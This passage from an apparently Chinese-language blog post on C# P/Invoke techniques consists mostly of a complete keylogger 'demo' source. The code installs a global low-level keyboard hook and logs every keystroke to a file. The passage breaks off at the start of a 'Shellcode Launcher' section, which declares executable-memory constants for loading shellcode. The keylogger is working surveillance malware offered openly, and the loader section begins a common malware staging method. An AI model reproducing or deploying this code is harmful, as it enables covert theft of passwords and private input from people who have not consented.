<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">Process</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">curProcess</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Process</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">GetCurrentProcess</span><span style="color: #ABB2BF">()) {</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">        // 低级键盘钩子</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">        // 返回一个钩子句柄</span></span>
<span class="line"><span style="color: #ABB2BF">		</span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">SetWindowsHookEx</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">WHKEYBOARDLL</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">proc</span><span style="color: #ABB2BF">, </span><span style="color: #61AFEF">GetModuleHandle</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">curProcess</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">ProcessName</span><span style="color: #ABB2BF">), </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">	}</span></span>
<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
<p>参考：<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/winmsg/using-hooks">Using Hooks</a></p>
<h4 id="键盘记录器-Demo">键盘记录器 Demo</h4>
<p>这是我写的一个键盘记录器 Demo。</p>
<p>总体的过程是创建一个进程，然后给这个进程上一个全局的低级键盘钩子，让每次按键执行的时候都会触发我们的回调函数，回调函数记录并且写入按键到硬盘。</p>
<figure class="shiki c#"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Diagnostics</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Runtime</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">InteropServices</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Windows</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Forms</span><span style="color: #ABB2BF">;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">class</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Program</span></span>
<span class="line"><span style="color: #ABB2BF">{</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">    // 定义一个静态字段来存储钩子句柄</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">_hookID</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Zero</span><span style="color: #ABB2BF">;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">    // 定义一个委托，用于处理键盘事件的回调函数</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">delegate</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">LowLevelKeyboardProc</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">nCode</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">wParam</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lParam</span><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">    // 实例化 LowLevelKeyboardProc 委托，并指向我们自己的钩子回调函数</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">LowLevelKeyboardProc</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">_proc</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">HookCallback</span><span style="color: #ABB2BF">;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">    // 这是 Windows API 函数的 P/Invoke 声明</span></span>
<span class="line"><span style="color: #ABB2BF">    [</span><span style="color: #E5C07B">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;user32.dll&quot;</span><span style="color: #ABB2BF">, CharSet </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">CharSet</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Auto</span><span style="color: #ABB2BF">, SetLastError </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">)]</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">SetWindowsHookEx</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">idHook</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">LowLevelKeyboardProc</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lpfn</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">hMod</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">uint</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">dwThreadId</span><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">    [</span><span style="color: #E5C07B">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;user32.dll&quot;</span><span style="color: #ABB2BF">, CharSet </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">CharSet</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Auto</span><span style="color: #ABB2BF">, SetLastError </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">)]</span></span>
<span class="line"><span style="color: #ABB2BF">    [</span><span style="color: #C678DD">return</span><span style="color: #ABB2BF">: </span><span style="color: #E5C07B">MarshalAs</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">UnmanagedType</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Bool</span><span style="color: #ABB2BF">)]</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">bool</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">UnhookWindowsHookEx</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">hhk</span><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">    [</span><span style="color: #E5C07B">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;kernel32.dll&quot;</span><span style="color: #ABB2BF">, CharSet </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">CharSet</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Auto</span><span style="color: #ABB2BF">, SetLastError </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">)]</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">GetModuleHandle</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">string</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lpModuleName</span><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">    // 键盘钩子类型，表示低级键盘钩子</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">WH_KEYBOARD_LL</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">13</span><span style="color: #ABB2BF">;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">    // 键盘消息常量</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">    // WM_KEYDOWN: 普通按键被按下时发送的消息</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">const</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">WM_KEYDOWN</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0x0100</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">    // WM_SYSKEYDOWN: 系统按键被按下时发送的消息（例如 ALT+TAB, F10 等）</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">const</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">WM_SYSKEYDOWN</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0x0104</span><span style="color: #ABB2BF">;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">    // 全局写入器</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">StreamWriter</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">logWriter</span><span style="color: #ABB2BF">;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">    // 程序的入口点，也是核心逻辑所在</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">void</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Main</span><span style="color: #ABB2BF">()</span></span>
<span class="line"><span style="color: #ABB2BF">    {</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">        // 在程序启动时，打开一个文件用于写入日志</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E06C75">logWriter</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> new </span><span style="color: #E5C07B">StreamWriter</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;keystrokes.log&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E06C75">_hookID</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">SetHook</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">_proc</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Application</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">Run</span><span style="color: #ABB2BF">();</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">UnhookWindowsHookEx</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">_hookID</span><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">        // 在程序退出时，关闭文件</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">logWriter</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">Close</span><span style="color: #ABB2BF">();</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Application</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">Exit</span><span style="color: #ABB2BF">();</span></span>
<span class="line"><span style="color: #ABB2BF">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">    // 安装钩子的方法</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">SetHook</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">LowLevelKeyboardProc</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">proc</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">    {</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">Process</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">curProcess</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Process</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">GetCurrentProcess</span><span style="color: #ABB2BF">())</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">ProcessModule</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">curModule</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">curProcess</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">MainModule</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">        {</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">            // SetWindowsHookEx 函数将我们的回调函数注册为钩子</span></span>
<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">SetWindowsHookEx</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">WH_KEYBOARD_LL</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">proc</span><span style="color: #ABB2BF">, </span><span style="color: #61AFEF">GetModuleHandle</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">curModule</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">ModuleName</span><span style="color: #ABB2BF">), </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">        }</span></span>
<span class="line"><span style="color: #ABB2BF">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">    // 钩子的回调函数，当有键盘事件发生时，Windows 会调用此函数</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">HookCallback</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">nCode</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">wParam</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lParam</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">    {</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">        // 如果 nCode 小于 0，不处理消息</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E06C75">nCode</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">&gt;=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">        {</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">            // 检查按键是否被按下</span></span>
<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E06C75">wParam</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">==</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75">WM_KEYDOWN</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">||</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">wParam</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">==</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75">WM_SYSKEYDOWN</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">            {</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">                // 获取虚拟键码</span></span>
<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">vkCode</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Marshal</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">ReadInt32</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">lParam</span><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">                // 将虚拟键码转换为 C# 的 Keys 枚举</span></span>
<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E5C07B">Keys</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">key</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">Keys</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75">vkCode</span><span style="color: #ABB2BF">;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">                // 判断按键是否是字母</span></span>
<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E06C75">key</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">&gt;=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Keys</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">A</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">key</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">&lt;=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Keys</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Z</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">                {</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">                    // 如果是字母，转换为小写并直接写入文件，不换行</span></span>
<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">logWriter</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">Write</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">key</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">ToString</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">ToLower</span><span style="color: #ABB2BF">());</span></span>
<span class="line"><span style="color: #ABB2BF">                }</span></span>
<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">else</span></span>
<span class="line"><span style="color: #ABB2BF">                {</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">                    // 如果是其他按键，将按键名称（用 [] 括起来）写入文件并换行</span></span>
<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">logWriter</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">WriteLine</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">$&quot; [{</span><span style="color: #E5C07B">key</span><span style="color: #98C379">.</span><span style="color: #61AFEF">ToString</span><span style="color: #98C379">()}]&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">                }</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">                // 确保内容立即写入文件，防止数据丢失</span></span>
<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E5C07B">logWriter</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">Flush</span><span style="color: #ABB2BF">();</span></span>
<span class="line"><span style="color: #ABB2BF">            }</span></span>
<span class="line"><span style="color: #ABB2BF">        }</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CallNextHookEx</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">_hookID</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">nCode</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">wParam</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">lParam</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">    // 将消息传递给 Hook 链中的下一个钩子</span></span>
<span class="line"><span style="color: #ABB2BF">    [</span><span style="color: #E5C07B">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;user32.dll&quot;</span><span style="color: #ABB2BF">, CharSet </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">CharSet</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Auto</span><span style="color: #ABB2BF">, SetLastError </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">)]</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CallNextHookEx</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">hhk</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">nCode</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">wParam</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lParam</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
<h3 id="Shellcode-Launcher">Shellcode Launcher</h3>
<p>Shellcode 加载器的 P/Invoke 过程：</p>
<figure class="shiki csharp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">MEM_COMMIT</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0x1000</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">PAGE_EXECUTE_READWRITE</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0x40</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #E5C07B">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;kernel32&quot;</span><span style="color: #ABB2BF">)]</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 调用进程的虚拟地址空间中分配、保留或提交内存区域</span></span>
